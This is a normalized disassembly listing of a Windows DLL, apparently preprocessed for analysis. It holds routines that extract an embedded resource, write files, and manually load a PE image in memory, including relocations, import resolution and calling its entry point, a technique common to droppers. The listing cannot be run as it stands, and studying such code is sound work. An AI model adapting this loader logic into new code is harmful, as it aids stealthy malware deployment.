sub_10001000
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
push eax
call [ GetModuleHandleA@IAT ]
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
mov ecx [ ebp + 0x8 ]
push ecx
call [ LoadLibraryA@IAT ]
mov [ ebp - 0x4 ] eax
sub_1000102b
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x4 ]
push eax
push r--data
push 0x0
mov ecx [ ebp + 0x8 ]
push ecx
call [ rw-data ]
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_10001052
push ebp
mov ebp esp
sub esp 0x14
push rw-data
call sub_10001000
add esp 0x4
mov [ ebp - 0x10 ] eax
push rw-data
mov eax [ ebp - 0x10 ]
push eax
call [ GetProcAddress@IAT ]
mov [ rw-data ] eax
mov [ ebp - 0x8 ] 0x0
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x4 ] 0x0
push 0x0
call [ CoInitialize@IAT ]
mov [ ebp - 0xc ] eax
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
push r--data
push 0x1
push 0x0
push r--data
call [ CoCreateInstance@IAT ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ecx ]
mov eax [ ebp - 0x4 ]
push eax
call [ edx + 0x8 ]
push 0x10840014
mov ecx [ ebp - 0x8 ]
mov edx [ ecx ]
mov eax [ ebp - 0x8 ]
push eax
call [ edx + 0x14 ]
push 0x0
push rw-data
mov ecx [ ebp - 0x4 ]
push ecx
mov edx [ ebp - 0x14 ]
push edx
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
mov edx [ ebp - 0x8 ]
push edx
call [ ecx + 0x40 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
mov edx [ ebp - 0x8 ]
push edx
call [ ecx + 0x54 ]
xor eax eax
test eax eax
jne r-xdata
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov ecx [ ebp - 0x14 ]
mov edx [ ecx ]
mov eax [ ebp - 0x14 ]
push eax
call [ edx + 0x8 ]
mov ecx [ ebp + 0x8 ]
push ecx
call sub_1000102b
add esp 0x4
mov [ ebp - 0x14 ] eax
mov edx [ ebp + 0xc ]
push edx
call sub_1000102b
add esp 0x4
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
call [ CoUninitialize@IAT ]
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x8 ]
mov edx [ ecx ]
mov eax [ ebp - 0x8 ]
push eax
call [ edx + 0x8 ]
sub_10001170
push ebp
mov ebp esp
push ecx
push 0x0
push 0x80
push 0x3
push 0x0
push 0x1
push 0x80000000
mov eax [ ebp + 0x8 ]
push eax
call [ CreateFileA@IAT ]
mov ecx [ ebp + 0xc ]
mov [ ecx + 0x200 ] eax
mov edx [ ebp + 0xc ]
cmp [ edx + 0x200 ] 0xffffffff
jne r-xdata
mov [ ebp - 0x4 ] 0x1
xor eax eax
jmp r-xdata
push 0x1ff
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp + 0xc ]
push edx
call [ strncpy@IAT ]
add esp 0xc
push 0x0
push 0x0
push 0x0
push 0x4
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x204 ]
push ecx
call [ MapViewOfFile@IAT ]
mov edx [ ebp + 0xc ]
mov [ edx + 0x208 ] eax
mov eax [ ebp + 0xc ]
cmp [ eax + 0x208 ] 0x0
jne r-xdata
jmp r-xdata
mov esp ebp
pop ebp
retn
mov [ ebp - 0x4 ] 0x1
xor ecx ecx
test ecx ecx
jne r-xdata
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
push 0x0
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x200 ]
push ecx
call [ GetFileSize@IAT ]
mov edx [ ebp + 0xc ]
mov [ edx + 0x20c ] eax
push 0x0
push 0x0
push 0x0
push 0x4000002
push 0x0
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x200 ]
push ecx
call [ CreateFileMappingA@IAT ]
mov edx [ ebp + 0xc ]
mov [ edx + 0x204 ] eax
mov eax [ ebp + 0xc ]
cmp [ eax + 0x204 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0xc ]
mov eax [ edx + 0x204 ]
push eax
call [ CloseHandle@IAT ]
mov ecx [ ebp + 0xc ]
mov edx [ ecx + 0x200 ]
push edx
call [ CloseHandle@IAT ]
sub_10001285
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x208 ] 0x0
je r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x204 ] 0x0
je r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x208 ]
push edx
call [ UnmapViewOfFile@IAT ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x208 ] 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x200 ] 0x0
je r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x204 ] 0xffffffff
je r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0x20c ] 0x0
mov eax 0x1
pop ebp
retn
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x200 ] 0xffffffff
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x204 ]
push ecx
call [ CloseHandle@IAT ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x204 ] 0x0
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x200 ]
push eax
call [ CloseHandle@IAT ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x200 ] 0x0
sub_1000132f
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
mov [ ebp - 0x14 ] eax
mov ecx [ ebp + 0x8 ]
and ecx 0xffff
mov [ ebp - 0x8 ] ecx
push rw-data
mov edx [ ebp - 0x8 ]
push edx
mov eax [ ebp - 0x14 ]
push eax
call [ FindResourceA@IAT ]
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0xc ]
push ecx
mov edx [ ebp - 0x14 ]
push edx
call [ LoadResource@IAT ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
push eax
call [ LockResource@IAT ]
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0xc ]
push ecx
mov edx [ ebp - 0x14 ]
push edx
call [ SizeofResource@IAT ]
mov ecx [ ebp + 0x10 ]
mov [ ecx ] eax
mov edx [ ebp + 0x10 ]
mov eax [ edx ]
push eax
call ??2@YAPAXI@Z
add esp 0x4
mov [ ebp - 0x18 ] eax
mov ecx [ ebp + 0xc ]
mov edx [ ebp - 0x18 ]
mov [ ecx ] edx
mov eax [ ebp + 0x10 ]
mov ecx [ eax ]
push ecx
push 0x0
mov edx [ ebp + 0xc ]
mov eax [ edx ]
push eax
call memset
add esp 0xc
mov ecx [ ebp + 0x10 ]
mov edx [ ecx ]
push edx
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp + 0xc ]
mov edx [ ecx ]
push edx
call memcpy
add esp 0xc
mov eax 0x1
mov esp ebp
pop ebp
retn
sub_100013e0
push ebp
mov ebp esp
sub esp 0x8
mov eax [ ebp + 0x10 ]
push eax
call [ DeleteFileA@IAT ]
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push 0x0
push 0x80
push 0x2
push 0x0
push 0x2
push 0x40000000
mov ecx [ ebp + 0x10 ]
push ecx
call [ CreateFileA@IAT ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0xffffffff
jne r-xdata
xor eax eax
jmp r-xdata
mov [ ebp - 0x4 ] 0x0
push 0x0
lea edx [ ebp - 0x4 ]
push edx
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp - 0x8 ]
push edx
call [ WriteFile@IAT ]
mov eax [ ebp - 0x8 ]
push eax
call [ CloseHandle@IAT ]
mov eax 0x1
xor eax eax
jmp r-xdata
mov esp ebp
pop ebp
retn
sub_10001455
push ebp
mov ebp esp
sub esp 0x8
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
mov edx [ ebp - 0x4 ]
cmp edx [ ebp + 0x10 ]
jge r-xdata
mov eax 0x1
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0x4 ]
xor ecx ecx
mov cl [ eax ]
mov edx [ ebp + 0xc ]
add edx [ ebp - 0x4 ]
xor eax eax
mov al [ edx ]
cmp ecx eax
je r-xdata
jmp r-xdata
xor eax eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
add ecx 0x1
mov [ ebp - 0x4 ] ecx
mov esp ebp
pop ebp
retn
sub_100014a2
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x14 ]
cmp eax [ ebp + 0xc ]
jle r-xdata
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov edx [ ebp + 0xc ]
sub edx [ ebp + 0x14 ]
cmp [ ebp - 0x4 ] edx
jg r-xdata
mov esp ebp
pop ebp
retn
or eax 0xffffffff
mov eax [ ebp + 0x14 ]
push eax
mov ecx [ ebp + 0x10 ]
push ecx
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0x4 ]
push edx
call sub_10001455
add esp 0xc
cmp eax 0x1
jne r-xdata
jmp r-xdata
mov eax [ ebp + 0x8 ]
add eax [ ebp - 0x4 ]
jmp r-xdata
mov ecx [ ebp - 0x4 ]
add ecx 0x1
mov [ ebp - 0x4 ] ecx
sub_100014fd
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
push eax
call [ GetFileAttributesA@IAT ]
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x4 ]
and ecx 0x10
cmp ecx 0x10
jne r-xdata
xor eax eax
jmp r-xdata
mov eax 0x1
xor eax eax
jmp r-xdata
mov esp ebp
pop ebp
retn
sub_10001530
push ebp
mov ebp esp
sub esp 0x20
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
mov ecx [ ebp + 0x8 ]
add ecx [ eax + 0x3c ]
mov [ ebp - 0x10 ] ecx
push 0x4
push 0x2000
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0x50 ]
push ecx
mov edx [ ebp - 0x10 ]
mov eax [ edx + 0x34 ]
push eax
call [ VirtualAlloc@IAT ]
mov [ ebp - 0x20 ] eax
cmp [ ebp - 0x20 ] 0x0
jne r-xdata
cmp [ ebp - 0x20 ] 0x0
jne r-xdata
push 0x4
push 0x2000
mov ecx [ ebp - 0x10 ]
mov edx [ ecx + 0x50 ]
push edx
push 0x0
call [ VirtualAlloc@IAT ]
mov [ ebp - 0x20 ] eax
push 0x14
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x20 ]
mov [ eax + 0x4 ] ecx
mov edx [ ebp - 0x4 ]
mov [ edx + 0xc ] 0x0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x8 ] 0x0
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x10 ] 0x0
push 0x4
push 0x1000
mov edx [ ebp - 0x10 ]
mov eax [ edx + 0x50 ]
push eax
mov ecx [ ebp - 0x20 ]
push ecx
call [ VirtualAlloc@IAT ]
push 0x4
push 0x1000
mov edx [ ebp - 0x10 ]
mov eax [ edx + 0x54 ]
push eax
mov ecx [ ebp - 0x20 ]
push ecx
call [ VirtualAlloc@IAT ]
mov [ ebp - 0x1c ] eax
mov edx [ ebp - 0x14 ]
mov eax [ edx + 0x3c ]
mov ecx [ ebp - 0x10 ]
add eax [ ecx + 0x54 ]
push eax
mov edx [ ebp - 0x14 ]
push edx
mov eax [ ebp - 0x1c ]
push eax
call memcpy
add esp 0xc
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x1c ]
add edx [ ecx + 0x3c ]
mov eax [ ebp - 0x4 ]
mov [ eax ] edx
mov ecx [ ebp - 0x4 ]
mov edx [ ecx ]
mov eax [ ebp - 0x20 ]
mov [ edx + 0x34 ] eax
mov ecx [ ebp - 0x4 ]
push ecx
mov edx [ ebp - 0x10 ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_100016ea
add esp 0xc
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x20 ]
sub edx [ ecx + 0x34 ]
mov [ ebp - 0xc ] edx
cmp [ ebp - 0xc ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov edx [ ebp - 0x4 ]
push edx
call sub_10001a12
add esp 0x4
test eax eax
jne r-xdata
mov eax [ ebp - 0xc ]
push eax
mov ecx [ ebp - 0x4 ]
push ecx
call sub_1000193a
add esp 0x8
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
push eax
call sub_100017e2
add esp 0x4
mov ecx [ ebp - 0x4 ]
mov edx [ ecx ]
cmp [ edx + 0x28 ] 0x0
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
mov edx [ ebp - 0x20 ]
add edx [ ecx + 0x28 ]
mov [ ebp - 0x8 ] edx
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
jmp r-xdata
push 0x0
push 0x1
mov eax [ ebp - 0x20 ]
push eax
call [ ebp - 0x8 ]
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
jmp r-xdata
mov edx [ ebp - 0x4 ]
push edx
call sub_10001cb8
add esp 0x4
xor eax eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x10 ] 0x1
jmp r-xdata
jmp r-xdata
jmp r-xdata
sub_100016ea
push ebp
mov ebp esp
sub esp 0x14
mov eax [ ebp + 0x10 ]
mov ecx [ eax + 0x4 ]
mov [ ebp - 0x10 ] ecx
mov edx [ ebp + 0x10 ]
mov eax [ edx ]
mov ecx [ ebp + 0x10 ]
mov edx [ ecx ]
xor ecx ecx
mov cx [ edx + 0x14 ]
lea edx [ eax + ecx + 0x18 ]
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x14 ] 0x0
jmp r-xdata
mov edx [ ebp + 0x10 ]
mov eax [ edx ]
xor ecx ecx
mov cx [ eax + 0x6 ]
cmp [ ebp - 0x14 ] ecx
jge r-xdata
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x8 ]
cmp [ edx + 0x10 ] 0x0
jne r-xdata
push 0x4
push 0x1000
mov eax [ ebp - 0x8 ]
mov ecx [ eax + 0x10 ]
push ecx
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x10 ]
add eax [ edx + 0xc ]
push eax
call [ VirtualAlloc@IAT ]
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0x8 ]
mov edx [ ecx + 0x10 ]
push edx
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0x8 ]
add ecx [ eax + 0x14 ]
push ecx
mov edx [ ebp - 0xc ]
push edx
call memcpy
add esp 0xc
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
mov [ eax + 0x8 ] ecx
jmp r-xdata
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x38 ]
mov [ ebp - 0x4 ] ecx
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
mov eax [ ebp - 0x14 ]
add eax 0x1
mov [ ebp - 0x14 ] eax
mov ecx [ ebp - 0x8 ]
add ecx 0x28
mov [ ebp - 0x8 ] ecx
jmp r-xdata
push 0x4
push 0x1000
mov edx [ ebp - 0x4 ]
push edx
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x10 ]
add ecx [ eax + 0xc ]
push ecx
call [ VirtualAlloc@IAT ]
mov [ ebp - 0xc ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
mov [ edx + 0x8 ] eax
mov ecx [ ebp - 0x4 ]
push ecx
push 0x0
mov edx [ ebp - 0xc ]
push edx
call memset
add esp 0xc
sub_100017e2
push ebp
mov ebp esp
sub esp 0x20
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
xor edx edx
mov dx [ eax + 0x14 ]
lea eax [ ecx + edx + 0x18 ]
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x8 ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
xor edx edx
mov dx [ ecx + 0x6 ]
cmp [ ebp - 0x8 ] edx
jge r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x24 ]
and ecx 0x20000000
neg ecx
sbb ecx ecx
neg ecx
mov [ ebp - 0x10 ] ecx
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x24 ]
and eax 0x40000000
neg eax
sbb eax eax
neg eax
mov [ ebp - 0x20 ] eax
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x24 ]
and edx 0x80000000
neg edx
sbb edx edx
neg edx
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x24 ]
and ecx 0x2000000
test ecx ecx
je r-xdata
mov eax [ ebp - 0x10 ]
shl eax 0x4
mov ecx [ ebp - 0x20 ]
lea edx [ eax + ecx * 8 + rw-data ]
mov eax [ ebp - 0xc ]
mov ecx [ edx + eax * 4 ]
mov [ ebp - 0x18 ] ecx
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x24 ]
and eax 0x4000000
test eax eax
je r-xdata
push 0x4000
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x10 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x8 ]
push edx
call [ VirtualFree@IAT ]
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x10 ]
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x18 ]
or ch 0x2
mov [ ebp - 0x18 ] ecx
mov ecx [ ebp - 0x8 ]
add ecx 0x1
mov [ ebp - 0x8 ] ecx
mov edx [ ebp - 0x4 ]
add edx 0x28
mov [ ebp - 0x4 ] edx
cmp [ ebp - 0x14 ] 0x0
jbe r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x24 ]
and edx 0x40
test edx edx
je r-xdata
jmp r-xdata
lea edx [ ebp - 0x1c ]
push edx
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x10 ]
push edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x8 ]
push ecx
call [ VirtualProtect@IAT ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x24 ]
and ecx 0x80
test ecx ecx
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ecx + 0x20 ]
mov [ ebp - 0x14 ] edx
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov ecx [ eax + 0x24 ]
mov [ ebp - 0x14 ] ecx
sub_1000193a
push ebp
mov ebp esp
sub esp 0x28
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x4 ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
add eax 0xa0
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0xc ]
cmp [ ecx + 0x4 ] 0x0
jbe r-xdata
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
add eax [ edx ]
mov [ ebp - 0x10 ] eax
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
add eax [ edx ]
mov [ ebp - 0x14 ] eax
mov ecx [ ebp - 0x10 ]
add ecx 0x8
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x8 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov edx [ ecx + 0x4 ]
sub edx 0x8
shr edx 0x1
cmp [ ebp - 0x8 ] edx
jae r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x10 ]
add ecx [ eax + 0x4 ]
mov [ ebp - 0x10 ] ecx
jmp r-xdata
mov eax [ ebp - 0x18 ]
xor ecx ecx
mov cx [ eax ]
sar ecx 0xc
mov [ ebp - 0x20 ] ecx
mov edx [ ebp - 0x18 ]
xor eax eax
mov ax [ edx ]
and eax 0xfff
mov [ ebp - 0x24 ] eax
mov ecx [ ebp - 0x20 ]
mov [ ebp - 0x28 ] ecx
cmp [ ebp - 0x28 ] 0x3
je r-xdata
mov ecx [ ebp - 0x10 ]
cmp [ ecx ] 0x0
jbe r-xdata
mov edx [ ebp - 0x14 ]
add edx [ ebp - 0x24 ]
mov [ ebp - 0x1c ] edx
mov eax [ ebp - 0x1c ]
mov ecx [ eax ]
add ecx [ ebp + 0xc ]
mov edx [ ebp - 0x1c ]
mov [ edx ] ecx
jmp r-xdata
mov edx [ ebp - 0x8 ]
add edx 0x1
mov [ ebp - 0x8 ] edx
mov eax [ ebp - 0x18 ]
add eax 0x2
mov [ ebp - 0x18 ] eax
jmp r-xdata
sub_10001a12
push ebp
mov ebp esp
sub esp 0x20
mov [ ebp - 0x4 ] 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x4 ]
mov [ ebp - 0x8 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
add eax 0x80
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0xc ]
cmp [ ecx + 0x4 ] 0x0
jbe r-xdata
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
add eax [ edx ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
push 0x14
mov edx [ ebp - 0x10 ]
push edx
call [ IsBadReadPtr@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
add edx [ ecx + 0xc ]
push edx
call [ LoadLibraryA@IAT ]
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0xffffffff
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0xc ]
lea edx [ ecx * 4 + 0x4 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
push ecx
call [ realloc@IAT ]
add esp 0x8
mov edx [ ebp + 0x8 ]
mov [ edx + 0x8 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0xc ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp - 0x18 ]
mov [ ecx + edx * 4 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0xc ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0xc ] edx
mov ecx [ ebp - 0x10 ]
cmp [ ecx ] 0x0
je r-xdata
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x8 ]
add ecx [ eax + 0x10 ]
mov [ ebp - 0x14 ] ecx
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
add eax [ edx + 0x10 ]
mov [ ebp - 0x1c ] eax
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
add eax [ edx ]
mov [ ebp - 0x14 ] eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
add edx [ ecx + 0x10 ]
mov [ ebp - 0x1c ] edx
jmp r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax ] 0x0
je r-xdata
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x14 ]
mov edx [ ecx ]
and edx 0x80000000
test edx edx
je r-xdata
jmp r-xdata
jmp r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x8 ]
add eax [ edx ]
mov [ ebp - 0x20 ] eax
mov ecx [ ebp - 0x20 ]
add ecx 0x2
push ecx
mov edx [ ebp - 0x18 ]
push edx
call [ GetProcAddress@IAT ]
mov ecx [ ebp - 0x1c ]
mov [ ecx ] eax
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
and ecx 0xffff
push ecx
mov edx [ ebp - 0x18 ]
push edx
call [ GetProcAddress@IAT ]
mov ecx [ ebp - 0x1c ]
mov [ ecx ] eax
jmp r-xdata
mov ecx [ ebp - 0x10 ]
add ecx 0x14
mov [ ebp - 0x10 ] ecx
jmp r-xdata
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
mov edx [ ebp - 0x1c ]
cmp [ edx ] 0x0
jne r-xdata
mov ecx [ ebp - 0x14 ]
add ecx 0x4
mov [ ebp - 0x14 ] ecx
mov edx [ ebp - 0x1c ]
add edx 0x4
mov [ ebp - 0x1c ] edx
sub_10001bc1
push ebp
mov ebp esp
sub esp 0x1c
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x4 ]
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x4 ] 0xffffffff
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
add eax 0x78
mov [ ebp - 0x1c ] eax
mov ecx [ ebp - 0x1c ]
cmp [ ecx + 0x4 ] 0x0
jne r-xdata
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x18 ]
add eax [ edx ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp - 0x8 ]
cmp [ ecx + 0x18 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
xor eax eax
jmp r-xdata
mov edx [ ebp - 0x8 ]
cmp [ edx + 0x14 ] 0x0
jne r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x18 ]
add ecx [ eax + 0x20 ]
mov [ ebp - 0x10 ] ecx
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x18 ]
add eax [ edx + 0x24 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x14 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x14 ]
cmp edx [ ecx + 0x18 ]
jae r-xdata
cmp [ ebp - 0x4 ] 0xffffffff
jne r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x18 ]
add ecx [ eax ]
push ecx
mov edx [ ebp + 0xc ]
push edx
call [ _stricmp@IAT ]
add esp 0x8
test eax eax
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
cmp eax [ edx + 0x14 ]
jbe r-xdata
xor eax eax
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0xc ]
xor ecx ecx
mov cx [ eax ]
mov [ ebp - 0x4 ] ecx
jmp r-xdata
mov ecx [ ebp - 0x8 ]
mov edx [ ecx + 0x1c ]
mov eax [ ebp - 0x4 ]
lea ecx [ edx + eax * 4 ]
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x18 ]
add eax [ edx + ecx ]
xor eax eax
jmp r-xdata
mov ecx [ ebp - 0x14 ]
add ecx 0x1
mov [ ebp - 0x14 ] ecx
mov edx [ ebp - 0x10 ]
add edx 0x4
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0xc ]
add eax 0x2
mov [ ebp - 0xc ] eax
sub_10001cb8
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
cmp [ ecx + 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ edx ]
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x4 ]
add edx [ eax + 0x28 ]
mov [ ebp - 0xc ] edx
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x4 ]
push ecx
call [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x10 ] 0x0
mov ecx [ ebp - 0x4 ]
cmp [ ecx + 0x4 ] 0x0
je r-xdata
mov [ ebp - 0x8 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x4 ]
push ecx
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
push 0x8000
push 0x0
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x4 ]
push eax
call [ VirtualFree@IAT ]
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
cmp eax [ edx + 0xc ]
jge r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x8 ]
push eax
call [ free@IAT ]
add esp 0x4
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x8 ]
mov eax [ ebp - 0x8 ]
cmp [ edx + eax * 4 ] 0xffffffff
je r-xdata
jmp r-xdata
